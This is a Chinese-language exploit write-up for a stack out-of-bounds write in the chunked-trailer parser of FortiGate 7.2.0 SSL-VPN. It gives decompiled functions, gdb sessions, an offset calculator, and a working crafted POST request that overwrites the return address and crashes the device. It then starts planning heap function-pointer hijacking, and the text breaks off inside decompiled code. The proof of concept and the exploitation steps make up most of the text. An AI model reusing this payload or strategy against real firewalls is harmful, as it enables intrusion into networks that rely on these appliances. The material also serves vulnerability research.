# 环境

FGT: 7.2.0

CPU: 1

# 前置知识

HTTP分块传输编码（Chunked Transfer Encoding）通常用于在客户端和服务器之间传输大数据量时，尤其是在服务器不能预先知道数据总大小的情况下，或数据是动态生成时。它属于HTTP/1.1及以上版本的一部分。

### 工作原理

在HTTP响应报文中，当启用分块传输编码时，数据会被分成多个“块”进行传输。每个块由以下几个部分组成：

分块格式：

- 块大小： 每个数据块前都有一个十六进制数字，表示该块的字节数（不包括这个大小字段本身）。
- 块数据：紧接着大小字段的是实际的块数据，按大小字段指定的字节数传输。
- 换行符： 每个块后面都会跟着一个换行符\r\n，分隔开各个块。

最后一个块：

当所有数据块传输完毕后，会有一个大小为0的块，表示传输结束。这个块后面通常会跟着一个空行（\r\n），表示响应结束。

chunk 编码格式如下：

```
[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
```

eg:

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/plain

4\r\n
Wiki\r\n
5\r\n
pedia\r\n
E\r\n
in chunks\r\n
0\r\n
\r\n
```

解释：

- 4\r\nWiki\r\n：第一个块的大小是4个字节，数据是Wiki
- 5\r\npedia\r\n：第二个块的大小是5个字节，数据是pedia。
- E\r\nin chunks\r\n：第三个块的大小是14个字节，数据是in chunks。
- 0\r\n\r\n：最后一个块，大小为0，表示传输结束。



# 漏洞原理

- 当解析 chunk 时，若长度字段解码后为 0，则触发读取 chunk trailer。
- 写入 chunk trailer 时，根据长度字段向栈中写入 \r\n。

# poc

查看一下处理chunk的流程在哪里：

```
handle SIGPIPE nostop
b *0x0000000001713A9F 
commands
    printf "read handler name:%s\n",$rcx+208
    continue
end
```

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string
import struct
import subprocess

SSLVPND_WORKER_COUNT = 1
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 20

HOST = "192.168.182.188"
PORT = 8443  

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

sk = create_ssl_socket()

sk.sendall(("POST / HTTP/1.1\r\n").encode())
sk.sendall(("Host: %s:%d\r\n"%(HOST,PORT)).encode())
sk.sendall(("Connection: keep-alive\r\n").encode())
sk.sendall(("Transfer-Encoding: chunked\r\n").encode())
sk.sendall("\r\n".encode())

sk.sendall("4\r\n".encode())
sk.sendall("Wiki\r\n".encode())
sk.sendall("0\r\n".encode())
sk.sendall("\r\n".encode())
```

```
Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:ssl_accept

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:ap_read_request

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:get_mimie_headers

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:read_client_block

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:read_client_block

Breakpoint 1, 0x0000000001713a9f in ?? ()
read handler name:http_write_memory
```

分析发现处理chunk请求的函数为read_client_block（sub_1705390）



最终处理函数为sub_1705390 -->  sub_1605950

```c
__int64 __fastcall sub_1705390(__int64 a1)
{
  __int64 v1; // rbx
  int v2; // eax
  __int64 result; // rax
  char v4[8200]; // [rsp+0h] [rbp-2020h] BYREF
  unsigned __int64 v5; // [rsp+2008h] [rbp-18h]

  v1 = *(_QWORD *)(a1 + 736);
  v5 = __readfsqword(0x28u);
  do
    v2 = sub_1605950(v1, (__int64)v4, 8190LL);
  while ( v2 > 0 );
  if ( v2 && (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(v1 + 8) + 40LL)) - 1 <= 4 )
    result = 0LL;
  else
    result = 6LL;
  return result;
}
```



```c
__int64 __fastcall sub_1605950(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rsi
  __int64 v6; // rax
  __int64 v7; // rsi
  __int64 v8; // rax
  bool v9; // zf
  char v10; // al
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rax
  __int64 result; // rax
  int v16; // eax
  __int64 v17; // r12
  const unsigned __int16 **v18; // rax
  unsigned __int8 *v19; // r13
  __int64 v20; // rax
  int v21; // eax
  __int64 v22; // rax
  __int64 v23; // rsi
  int v24; // esi
  __int64 v25; // rdx
  __int64 v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rdx
  int v30; // eax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rdx
  __int64 v34; // rcx
  __int64 v35; // rax
  __int64 v36; // rax
  __int64 v37; // rdx
  __int64 v38; // rax
  char v39; // [rsp+7h] [rbp-29h] BYREF
  unsigned __int64 v40; // [rsp+8h] [rbp-28h]

  v5 = (unsigned int)a3;
  v40 = __readfsqword(0x28u);
  v39 = 0;
  switch ( *(_DWORD *)(a1 + 704) )
  {
    case 1:
      a2 = *(_QWORD *)(a1 + 744);
      goto LABEL_31;
    case 2:
      v5 = *(unsigned int *)(a1 + 736);
      a2 = *(_QWORD *)(a1 + 744);
      goto LABEL_12;
    case 3:
      goto LABEL_18;
    case 4:
      v23 = *(unsigned int *)(a1 + 736);
      goto LABEL_21;
    case 5:
      goto LABEL_2;
    case 8:
      goto LABEL_5;
    case 9:
      goto LABEL_34;
    default:
      v30 = *(_DWORD *)(a1 + 264);
      *(_QWORD *)(a1 + 720) = 0LL;
      *(_QWORD *)(a1 + 712) = 0LL;
      *(_QWORD *)(a1 + 728) = 0LL;
      *(_DWORD *)(a1 + 736) = a3;
      *(_QWORD *)(a1 + 744) = a2;
      if ( v30 )
      {
        if ( *(_DWORD *)(a1 + 260) == 3 )
        {
          v5 = (unsigned int)(a3 - 2);
          *(_DWORD *)(a1 + 736) = v5;
        }
        if ( (int)v5 <= 0 )
        {
          sub_15FC2B0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 0xFFFFFFFC);
          result = -1LL;
          *(_DWORD *)(a1 + 704) = 0;
          return result;
        }
        v34 = *(unsigned int *)(a1 + 256);
        if ( (_DWORD)v34 )
        {
          v35 = *(_QWORD *)(a1 + 248);
          if ( v35 >= 0 && v35 > (int)v34 )
          {
            sub_166F020(
              *(_QWORD *)(*(_QWORD *)(a1 + 8) + 368LL),
              8LL,
              (__int64)"Chunked request body is larger than limit of %d",
              v34);
            sub_15FC2B0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 0xFFFFFFFC);
            *(_BYTE *)(a1 + 766) |= 0x18u;
            result = -1LL;
            *(_DWORD *)(a1 + 704) = 0;
            return result;
          }
        }
        v32 = *(_QWORD *)(a1 + 240);
        if ( v32 )
        {
LABEL_50:
          if ( v32 == -1 )
          {
            v23 = *(unsigned int *)(a1 + 736);
            *(_QWORD *)(a1 + 712) = *(_QWORD *)(a1 + 728);
            while ( (int)v23 > 1 )//实际进行读取 chunk trailer
            {
              *(_DWORD *)(a1 + 704) = 4;
LABEL_21:
              if ( (int)sub_160B840(*(_QWORD *)(a1 + 744), v23, *(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 1LL) <= 0 )//ap_getline: eg "aaa\r\n",其返回值为a的个数，为3，"\r\n"时，返回0
              {
                if ( (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) - 1 <= 4 )
                  return -1LL;
                break;
              }
              v24 = *(_DWORD *)(a1 + 736);//缓冲区剩余大小，第一次执行该循环时，已经减去3
              v25 = *(_QWORD *)(a1 + 712);//当前应该在缓冲区中写入/r/n的位置，当第一次执行该循环时，为3（0 \r \n 刚好3字节），以后循环每次加2（\r \n 刚好两字节）eg:3 5 7 9 11
              v26 = v24 - 1;
              if ( v25 != v26 )
              {
                v27 = *(_QWORD *)(a1 + 744);
                *(_QWORD *)(a1 + 712) = v25 + 1;
                *(_BYTE *)(v27 + v25) = '\r';
                v28 = *(_QWORD *)(a1 + 712);
                v29 = *(_QWORD *)(a1 + 744);
                *(_QWORD *)(a1 + 712) = v28 + 1;
                *(_BYTE *)(v29 + v28) = '\n';
                v26 = *(_QWORD *)(a1 + 712);
                v24 = *(_DWORD *)(a1 + 736);
              }
              v23 = (unsigned int)(v24 - v26);
              *(_QWORD *)(a1 + 728) += v26;
              *(_QWORD *)(a1 + 744) += v26;//漏洞点，缓冲区也跟着前移
              *(_DWORD *)(a1 + 736) = v23;
            }
            if ( *(__int64 *)(a1 + 712) >= 0 )
            {
              if ( *(_QWORD *)(a1 + 712) )
              {
                result = *(_QWORD *)(a1 + 728);
              }
              else
              {
                **(_BYTE **)(a1 + 744) = 13;
                *(_BYTE *)(*(_QWORD *)(a1 + 744) + 1LL) = 10;
                v31 = *(_QWORD *)(a1 + 728);
                *(_QWORD *)(a1 + 240) = -2LL;
                result = v31 + 2;
                *(_QWORD *)(a1 + 728) = result;
              }
              *(_QWORD *)(a1 + 248) += result;
              *(_DWORD *)(a1 + 704) = 0;
              return result;
            }
            goto LABEL_77;
          }
          if ( v32 == -2 )
          {
            *(_QWORD *)(a1 + 240) = 0LL;
            result = 0LL;
            *(_DWORD *)(a1 + 704) = 0;
            return result;
          }
          v33 = *(int *)(a1 + 736);
          if ( v33 > v32 )
            v33 = v32;
          *(_QWORD *)(a1 + 720) = v33;
LABEL_2:
          v6 = *(_QWORD *)(a1 + 8);
          v7 = *(_QWORD *)(a1 + 744);
          *(_DWORD *)(a1 + 704) = 5;
          v8 = (int)((__int64 (__fastcall *)(_QWORD, __int64))sub_160ACE0)(*(_QWORD *)(v6 + 40), v7);
          *(_QWORD *)(a1 + 712) = (int)v8;
          if ( (int)v8 <= 0 )
          {
LABEL_77:
            *(_BYTE *)(a1 + 766) |= 0x18u;
LABEL_78:
            *(_DWORD *)(a1 + 704) = 0;
            return -1LL;
          }
          v9 = *(_QWORD *)(a1 + 240) == (int)v8;
          *(_QWORD *)(a1 + 240) -= (int)v8;
          if ( !v9 )
          {
LABEL_10:
            *(_QWORD *)(a1 + 248) += *(_QWORD *)(a1 + 728) + v8;
            sub_15FC2B0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 0);
            v14 = *(_QWORD *)(a1 + 712);
            *(_DWORD *)(a1 + 704) = 0;
            return *(_QWORD *)(a1 + 728) + v14;
          }
          *(_DWORD *)(a1 + 704) = 8;
LABEL_5:
          if ( (int)sub_160B860(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), &v39) > 0 )
          {
            v10 = v39;
            if ( v39 != '\r' )
              goto LABEL_7;
            *(_DWORD *)(a1 + 704) = 9;
LABEL_34:
            if ( (int)sub_160B860(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), &v39) > 0 )
              goto LABEL_35;
          }
          if ( (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) - 1 > 4 )
          {
LABEL_35:
            v10 = v39;
LABEL_7:
            if ( v10 == '\n' )
            {
              v8 = *(_QWORD *)(a1 + 712);
              if ( *(_DWORD *)(a1 + 260) == 3 )
              {
                v11 = *(_QWORD *)(a1 + 744);
                *(_QWORD *)(a1 + 712) = v8 + 1;
                *(_BYTE *)(v11 + v8) = '\r';
                v12 = *(_QWORD *)(a1 + 712);
                v13 = *(_QWORD *)(a1 + 744);
                *(_QWORD *)(a1 + 712) = v12 + 1;
                *(_BYTE *)(v13 + v12) = '\n';
                v8 = *(_QWORD *)(a1 + 712);
              }
              goto LABEL_10;
            }
            goto LABEL_77;
          }
          return -1LL;
        }
        *(_DWORD *)(a1 + 704) = 2;
LABEL_12:
        v16 = sub_160B840(a2, v5, *(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 0LL);//ap_getline:返回值为除去\r\n的字符个数
        v17 = v16;
        *(_QWORD *)(a1 + 728) = v16;
        if ( v16 <= 0 )
        {
          if ( (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) != 1
            && (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) != 2
            && (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) != 3
            && (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) != 4
            && (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) != 5 )
          {
            *(_BYTE *)(a1 + 766) |= 0x18u;
            result = -1LL;
            *(_DWORD *)(a1 + 704) = 0;
            return result;
          }
          return -1LL;
        }
        if ( v16 < (__int64)(*(_DWORD *)(a1 + 736) - 1) )
        {
          v18 = __ctype_b_loc();
          v19 = *(unsigned __int8 **)(a1 + 744);
          if ( ((*v18)[*v19] & 0x1000) != 0 )
          {
            v20 = sub_16058A0(*(_QWORD *)(a1 + 744)); // 获取块大小
            *(_QWORD *)(a1 + 720) = v20;
            if ( !v20 )//0 字节的块表示结束，则触发读取 chunk trailer。
            {
              v21 = *(_DWORD *)(a1 + 260);
              if ( v21 == 2 )//v21此时等于3
              {
                *(_DWORD *)(a1 + 704) = 3;
LABEL_18:
                ((void (__fastcall *)(__int64, __int64))sub_1604200)(a1, v5);
                if ( !(unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) )
                {
                  snprintf(*(char **)(a1 + 744), *(int *)(a1 + 736), off_302915B, *(_QWORD *)(a1 + 248));
                  sub_15F2390(*(_QWORD *)(a1 + 280), "Transfer-Encoding");
                  v22 = (__int64)sub_15F1560(*(_QWORD *)a1, *(const char **)(a1 + 744));
                  sub_15F2280(*(_QWORD *)(a1 + 280), "Content-Length", v22);
                  result = 0LL;
                  *(_DWORD *)(a1 + 704) = 0;
                  return result;
                }
                if ( (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 1
                  || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 2
                  || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 3
                  || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 4
                  || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 5 )
                {
                  return -1LL;
                }
                goto LABEL_78;
              }
              *(_QWORD *)(a1 + 240) = -1LL;
              goto LABEL_47;//goto：触发读取 chunk trailer。
            }
            if ( v20 >= 0 )
            {
              *(_QWORD *)(a1 + 240) = v20;
              v21 = *(_DWORD *)(a1 + 260);
LABEL_47:
              if ( v21 == 3 )
              {
                *(_QWORD *)(a1 + 728) = v17 + 1;
                v19[v17] = '\r';
                v36 = *(_QWORD *)(a1 + 728);
                v37 = *(_QWORD *)(a1 + 744);
                *(_QWORD *)(a1 + 728) = v36 + 1;
                *(_BYTE *)(v37 + v36) = '\n';
                v38 = *(_QWORD *)(a1 + 728);
                *(_QWORD *)(a1 + 744) += v38;
                *(_DWORD *)(a1 + 736) -= v38;
              }
              else
              {
                *(_QWORD *)(a1 + 728) = 0LL;
              }
              v32 = *(_QWORD *)(a1 + 240);
              goto LABEL_50;//goto：触发读取 chunk trailer。
            }
            *(_BYTE *)(a1 + 766) |= 0x18u;
          }
        }
        sub_15FC2B0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), 4294967293u);
        result = -1LL;
        *(_DWORD *)(a1 + 704) = 0;
        return result;
      }
      *(_DWORD *)(a1 + 704) = 1;
      a3 = (int)a3;
      if ( *(_QWORD *)(a1 + 240) <= (int)a3 )
        a3 = *(_QWORD *)(a1 + 240);
      *(_QWORD *)(a1 + 720) = a3;
LABEL_31:
      result = (int)((__int64 (__fastcall *)(_QWORD, __int64))sub_160ACE0)(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL), a2);
      *(_QWORD *)(a1 + 712) = (int)result;
      if ( (int)result > 0 )
      {
        *(_QWORD *)(a1 + 248) += (int)result;
        *(_QWORD *)(a1 + 240) -= (int)result;
        *(_DWORD *)(a1 + 704) = 0;
        return result;
      }
      if ( !(_DWORD)result )
        goto LABEL_44;
      if ( (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 1
        || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 2
        || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 3
        || (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 4 )
      {
        return *(_QWORD *)(a1 + 712);
      }
      v9 = (unsigned int)sub_15FC2D0(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 40LL)) == 5;
      result = *(_QWORD *)(a1 + 712);
      if ( !v9 )
      {
LABEL_44:
        *(_BYTE *)(a1 + 766) |= 0x18u;
        *(_DWORD *)(a1 + 704) = 0;
      }
      return result;
  }
}
```

通过逆向分析，编写如下脚本：

```python
#!/usr/bin/python3

def write_test(zero_count=1,buflen=8190,buf_offset = 0):
    # 对于接受到 chunk tailer后也就是 0\r\n后
    buf_offset = 2 + zero_count
    write_offset = 2 + zero_count
    buf_remaining_len = buflen - (2 + zero_count)

    count_for_r_n = 1
    # 接受后续的A\r\n
    while buf_remaining_len > 2:#>2的原因是后续的输入必须为A\r\n这种

        if buf_remaining_len - 1 != write_offset:
            if buf_offset+write_offset > buflen:
                print("\\r\\n zero count:",zero_count)
                print("\\r\\n count:",count_for_r_n)
                print("\\r\\n write offset",buf_offset+write_offset)

        write_offset = write_offset+2
        buf_offset = buf_offset + write_offset
        buf_remaining_len = buf_remaining_len - write_offset
        count_for_r_n = count_for_r_n + 1

for i in range(1,8190):
    # zero_count = b'0'*zero_count + b"\r\n"
    write_test(zero_count=i)
```

Output:

```
\r\n write offset 16356
\r\n zero count: 8177
\r\n count: 1
\r\n write offset 16358
\r\n zero count: 8178
\r\n count: 1
\r\n write offset 16360
\r\n zero count: 8179
\r\n count: 1
\r\n write offset 16362
\r\n zero count: 8180
\r\n count: 1
\r\n write offset 16364
\r\n zero count: 8181
\r\n count: 1
\r\n write offset 16366
\r\n zero count: 8182
\r\n count: 1
\r\n write offset 16368
\r\n zero count: 8183
\r\n count: 1
\r\n write offset 16370
\r\n zero count: 8184
\r\n count: 1
\r\n write offset 16372
```

对栈上的数据，我们可以越界写 16372 - 8200=8,172 



逆向分析8200缓冲区距离ret的返回地址为：0x7fff9a7689c8 - 0x7fff9a7669a0 = 0x2028 = 8232



对应的脚本输出：

```
\r\n zero count: 132
\r\n count: 45
\r\n write offset 8232
```

也就是说我们可以发送:

```python
data  = b"POST / HTTP/1.1\r\n"
data += b"Host: 192.168.182.188:8443\r\n"
data += b"Transfer-Encoding: chunked\r\n"
data += b"Connection: keep-alive\r\n"
data += b"\r\n"
data += b"0"*132 + b"\r\n"
data += b"A\r\n"*45
```

结果正确将返回值写为了0a0d

```
(gdb) x /2gx $rbp
0x7fff9a7689c0:	0x00007fff9a768a10	0x0000000001713ad5
(gdb) ni
0x00000000017053c6 in ?? ()
(gdb) x /2gx $rbp
0x7fff9a7689c0:	0x00007fff9a768a10	0x0000000001710a0d
(gdb) c
Program received signal SIGILL, Illegal instruction.
0x0000000001710a0d in ?? ()
```

# exp

该漏洞只能对栈上有限的空间写入两字节的数据，尝试通过修改rbp的地址，然后利用 leave ret，使其指向我们输入数据的缓冲区，但是发现函数返回都是通过 pop 、ret来实现的。



我们考虑使用堆利用，通过修改函数中本地变量为堆指针的数据，使其指向我们控制的堆来达到堆利用。



正常情况下的到该函数(sub_1705390，也就是read_client_block)的栈信息：

```
Breakpoint 1, 0x00000000017053a3 in ?? ()
(gdb) bt
#0  0x00000000017053a3 in ?? ()
#1  0x0000000001713ad5 in ?? ()
#2  0x00000000017152a0 in ?? ()
#3  0x000000000171537e in ?? ()
#4  0x0000000001715b91 in ?? ()
#5  0x0000000001716f42 in ?? ()
#6  0x000000000171831c in ?? ()
#7  0x000000000044c88f in ?? ()
#8  0x00000000004554ca in ?? ()
#9  0x000000000045212c in ?? ()
#10 0x0000000000454738 in ?? ()
#11 0x0000000000455061 in ?? ()
#12 0x00007f3bd84fadeb in __libc_start_main () from /usr/lib/x86_64-linux-gnu/libc.so.6
#13 0x0000000000447daa in ?? ()
(gdb) x /100gx $rbp
0x7fff9a7689c0:	0x00007fff9a768a10	0x0000000001713ad5(返回地址)
0x7fff9a7689d0:	0x0000000000000000	0x00007f3bd2616c18
0x7fff9a7689e0:	0x00007fff9a768a10	0x0000000000000000
0x7fff9a7689f0:	0x00007f3bd25464c0	0x00007f3bd2546400
0x7fff9a768a00:	0x0000000000000000	0x0000000102a761db
0x7fff9a768a10:	0x00007fff9a768a40	0x00000000017152a0(返回地址)
0x7fff9a768a20:	0x000000000bba80c0	0x000000000bba80c0
0x7fff9a768a30:	0x0000000000000000	0x0000000000000000
0x7fff9a768a40:	0x00007fff9a768a70	0x000000000171537e(返回地址)
0x7fff9a768a50:	0x00007fff9a76abb0	0xfffffffffffffed5
0x7fff9a768a60:	0x0000000102a84992	0x0000000102a84992
0x7fff9a768a70:	0x00007fff9a76abb0	0x0000000001715b91(返回地址)
0x7fff9a768a80:	0x0000000000000004	0x00000000015fc5c4
0x7fff9a768a90:	0x0000000000768ac0	0x0000000102a7d726
0x7fff9a768aa0:	0x00007fff9a768ae0	0x0000000000001ffe
0x7fff9a768ab0:	0x0000000000000000	0x0000000000000000
0x7fff9a768ac0:	0x00007fff9a768b40	0x00007f3bd25b8b10
0x7fff9a768ad0:	0x00007fff9a768b10	0x000000000161426b
0x7fff9a768ae0:	0x00007fff9a768b10	0x00007f3bd326bc18
0x7fff9a768af0:	0x00007f3bd25b8af8	0x00007f3bd3db26f0
0x7fff9a768b00:	0x00007fff9a768b40	0x00007f3bd25b8b10
0x7fff9a768b10:	0x00007fff9a76ab80	0x000000000162368c
0x7fff9a768b20:	0x00007f3bd34002f0	0x00007f3bd3399b40
0x7fff9a768b30:	0x00007f3bd3db2768	0x00007fff9a768b55
```

发现函数sub_1715180、sub_1713A40中的a1局部变量是一个堆指针，且该指针指向一个结构体，结构体中存在大量的函数指针在sub_1715180与sub_1713A40中被调用

```c
__int64 __fastcall sub_1715180(__int64 a1, char a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  int v4; // er14
  __int64 v5; // r12
  __int64 v6; // rbx
  __int64 v7; // rsi
  __int64 v8; // rdx
  __int64 (__fastcall *v9)(__int64); // rax
  __int64 v10; // rax

  v2 = qword_BBA80C0;
  if ( qword_BBA80C0 - 1000 - *(_QWORD *)(a1 + 984) >= 0 )
  {
    ((void (*)(void))sub_166BB70)();
    v2 = qword_BBA80C0;
  }
  if ( v2 - (unsigned int)(*(_DWORD *)(a1 + 912) + 1000) >= 0 )
  {
    sub_166BE70(a1);
    v2 = qword_BBA80C0;
  }
  if ( v2 - (unsigned int)(*(_DWORD *)(a1 + 936) + 12000) >= 0 )
    sub_162B390(a1);
  if ( !a2 || (result = sub_162AA90(a1), (int)result >= 0) )
  {
    v4 = 0;
    result = sub_1722770(a1);
    do
    {
      v5 = a1 + 32 * (v4 + 6LL);
      if ( (*(_BYTE *)(v5 + 16) & 2) != 0 )
      {
        result = sub_1713A40(a1, v4, 1u);//进行读操作
        if ( (_DWORD)result )
          goto LABEL_23;
        *(_BYTE *)(v5 + 16) &= 0xFDu;
      }
      v6 = a1 + 32 * (v4 + 6LL);
      if ( (*(_BYTE *)(v6 + 16) & 4) != 0 )
      {
        result = sub_1713A40(a1, v4, 0);//进行写操作
        if ( (_DWORD)result )
        {
LABEL_23:
          v10 = *(_QWORD *)(a1 + 0x298);
          if ( v10 )
          {
            v9 = *(__int64 (__fastcall **)(__int64))(v10 + 0x88);
            if ( v9 )
              return v9(a1);
          }
          return sub_1713E80(a1);
        }
        *(_BYTE *)(v6 + 16) &= 0xFBu;
      }
      ++v4;
    }
    while ( v4 != 5 );
    v7 = *(_QWORD *)(a1 + 0x298);
    if ( v7 )
    {
      v8 = *(_QWORD *)(v7 + 0x70);
      if ( v8 )
      {
        result = v7 + 96;
        if ( v8 != v7 + 96 )
        {
          v9 = *(__int64 (__fastcall **)(__int64))(v8 + 0xC8);
          if ( v9 )
            return v9(a1);
          result = sub_1713400(a1, v7, v8);
        }
      }
    }
  }
  return result;
}
```

```c
__int64 __fastcall sub_1713A40(__int64 a1, int a2, unsigned int a3)
{
  char v4; // al
  __int64 v5; // r13
  __int64 v6; // rsi
  __int64 v7; // rcx
  __int64 v8; // r14
  unsigned int v9; // ebx
  __int64 v10; // rdx
  __int64 (__fastcall *v11)(__int64); // rax
  char v12; // al
  __int64 result; // rax
  __int64 (__fastcall *v14)(__int64, __int64, __int64, __int64); // rax
  __int64 v15; // rcx
  __int64 j; // rax
  __int64 *v17; // rax
  __int64 v18; // rcx
  __int64 i; // rax
  __int64 v20; // rcx
  __int64 k; // rax
  __int64 *v22; // rax
  __int64 v23; // rcx
  __int64 l; // rax
  __int64 v25; // rcx
  __int64 m; // rax
  __int64 v27; // [rsp+8h] [rbp-38h]

  v4 = *(_BYTE *)(a1 + 1143);
  v5 = *(_QWORD *)(a1 + 664);
  v6 = v4 & 0x20;
  if ( !v5 || (v7 = *(_QWORD *)(v5 + 0x70)) == 0 || (v8 = v5 + 96, v5 + 96 == v7) )
  {
    if ( !(_BYTE)v6 )
    {
      if ( (v4 & 0x40) == 0 )
      {
LABEL_19:
        if ( (int)sub_17136C0(a1, v5) < 0 )
        {
          if ( !sub_17050F0(a1) )
          {
            sub_17050D0(a1);
            return 1LL;
          }
        }
        else if ( !sub_17050F0(a1) )
        {
          return sub_1713720(a1);
        }
        return 1LL;
      }
      return sub_1713720(a1);
    }
    goto LABEL_66;
  }
  v9 = a3;
  if ( a2 < 0 )
  {
    if ( !(_BYTE)v6 )
    {
      v12 = v4 & 0x40;
      goto LABEL_15;
    }
LABEL_66:
    *(_BYTE *)(a1 + 1140) |= 0x80u;
    return 0xFFFFFFFFLL;
  }
  if ( (_BYTE)v6 )
    goto LABEL_66;
  v27 = *(_QWORD *)(v5 + 0x70);
  sub_2902A70(a3);
  if ( v9 )
  {
    v11 = *(__int64 (__fastcall **)(__int64))(32LL * a2 + v27 + 32);//读
    if ( !v11 )
      return 0xFFFFFFFFLL;
    v9 = v11(a1);
    v12 = *(_BYTE *)(a1 + 1143) & 0x40;
    if ( !v9 )
    {
      if ( v12 )
        goto LABEL_10;
      *(_DWORD *)(v27 + 32LL * a2 + 16) = sub_1713990(a1, a2, 1);
      if ( (*(_BYTE *)(a1 + 1143) & 0x40) != 0 )
        return sub_1713720(a1);
      return 0LL;
    }
  }
  else
  {
    v14 = *(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(32LL * a2 + v27 + 40);//写
    if ( !v14 )
      return 0xFFFFFFFFLL;
    v9 = v14(a1, v6, v10, v27);
    v12 = *(_BYTE *)(a1 + 1143) & 0x40;
    if ( v12 )
    {
LABEL_10:
      if ( v9 == 7 )
        return 0xFFFFFFFFLL;
      return sub_1713720(a1);
    }
    if ( !v9 )
    {
      *(_DWORD *)(v27 + 32LL * a2 + 20) = sub_1713990(a1, a2, 0);
      if ( (*(_BYTE *)(a1 + 1143) & 0x40) != 0 )
        return sub_1713720(a1);
      return 0LL;
    }
  }
LABEL_15:
  if ( v12 )
    goto LABEL_10;
  switch ( v9 )
  {
    case 0u:
      return v9;
    case 1u:
      v18 = *(_QWORD *)(*(_QWORD *)(v5 + 112) + 8LL);
      if ( v18 == v8 )
        return 0xFFFFFFFFLL;
      for ( i = 0LL; i != 40; i += 8LL )
      {
        if ( *(_QWORD *)(a1 + i + 616) )
        {
          *(_DWORD *)(v18 + 4 * i + 16) = *(_DWORD *)(v18 + 4 * i + 24);
          *(_DWORD *)(v18 + 4 * i + 20) = *(_DWORD *)(v18 + 4 * i + 28);
        }
      }
      *(_QWORD *)(v5 + 112) = *(_QWORD *)(*(_QWORD *)(v5 + 112) + 8LL);
      return 0LL;
    case 2u:
      v22 = *(__int64 **)(v5 + 112);
      goto LABEL_46;
    case 3u:
      v17 = *(__int64 **)(v5 + 112);
      goto LABEL_40;
    case 4u:
      v15 = **(_QWORD **)(v5 + 112);
      if ( v15 == v8 )
        goto LABEL_19;
      for ( j = 0LL; j != 40; j += 8LL )
      {
        if ( *(_QWORD *)(a1 + j + 616) )
        {
          *(_DWORD *)(v15 + 4 * j + 16) = *(_DWORD *)(v15 + 4 * j + 24);
          *(_DWORD *)(v15 + 4 * j + 20) = *(_DWORD *)(v15 + 4 * j + 28);
        }
      }
      v17 = **(__int64 ***)(v5 + 112);
      *(_QWORD *)(v5 + 112) = v17;
LABEL_40:
      v20 = *v17;
      if ( *v17 == v8 )
        goto LABEL_19;
      for ( k = 0LL; k != 40; k += 8LL )
      {
